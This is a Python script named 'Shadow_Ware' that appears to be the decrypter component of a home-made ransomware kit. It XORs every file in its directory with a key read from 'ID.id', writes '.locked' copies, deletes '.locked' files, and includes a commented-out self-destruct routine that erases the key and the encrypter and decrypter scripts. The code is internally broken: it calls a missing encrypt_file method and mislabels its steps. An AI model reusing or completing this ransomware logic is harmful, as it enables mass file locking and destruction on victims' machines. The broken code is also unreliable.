import base64, os, hashlib, hmac

""" Class for encrypter """
class Shadow_Ware():
  def __init__(self):
    self.ignored_files = [
      "ID.id",
      "encrypter.py",
      ".git",
      'hooks', 'refs', 'info', 'lfs', 'logs', 'objects', 'branches', 'remotes', 'heads', 'tags', 'origin', 'tmp', 'refs', 'remotes', 'heads', 'origin', 'pack', 'info'  
    ]

    # Keys and ID
    self.bytes_key = self.get_key()

    # Current Dir
    self.current_dir = os.path.dirname(__file__)

  def get_key(self):
      key = ""
      with open("ID.id", "rb") as ID:
          key = base64.b64decode(ID.read())
      return key

  def get_bytes_key(self, key):
    return key.encode("utf-8")

  # Get all files 
  def get_file_in_dir(self, dir):
    files = []
    for file in os.listdir(dir):
      if file not in self.ignored_files:
        files.append(file)
    return files

  def get_dir_in_dir(self, dir):
    directories = []
    for root, dirs, files in os.walk(dir):
      for directory in dirs:
        if directory not in self.ignored_files:
          directories.append(directory)
    return directories

  def get_all_files(self, dir):
    all_files = []
    for root, dirs, files in os.walk(dir):
        for file in files:
            file_path = os.path.join(root, file)
            if file_path not in self.ignored_files:
                all_files.append(file_path)
    return all_files


  # Decryption code
  def decrypt_file(self, input_file, output_file):
      with open(input_file, "rb") as file:
          encrypted_data = file.read()

      decrypted_data = bytearray(len(encrypted_data))
      for i in range(len(encrypted_data)):
          decrypted_data[i] = encrypted_data[i] ^ self.bytes_key[i % len(self.bytes_key)]

      with open(output_file, "wb") as file:
          file.write(decrypted_data)


  # Encrypt All Files
  def decrypt_all_files(self):
    files = self.get_all_files(self.current_dir)
    for file in files:
      if file not in self.ignored_files and os.path.abspath(file) != os.path.abspath("decrypter.py"):
        print("Locking file " + file)
        self.encrypt_file(file, file + ".locked")

  # Remove not locked files
  def remove_locked_files(self):
    files = self.get_all_files(self.current_dir)
    for file in files:
        if file.endswith(".locked"):
            print("Removed " + file)
            os.remove(file)

  def self_destruct(self):
    os.remove(os.path.abspath("ID.id"))
    os.remove(os.path.abspath("ID.id.locked"))
    os.remove(os.path.abspath("encrypter.py"))
    os.remove(os.path.abspath("encrypter.py.locked"))
    os.remove(os.path.abspath("decrypter.py.locked"))
    os.remove(os.path.abspath(__file__))

if __name__ == "__main__":
  shadow_ware = Shadow_Ware()
  shadow_ware.decrypt_all_files()
  shadow_ware.remove_locked_files()
  #shadow_ware.self_destruct()
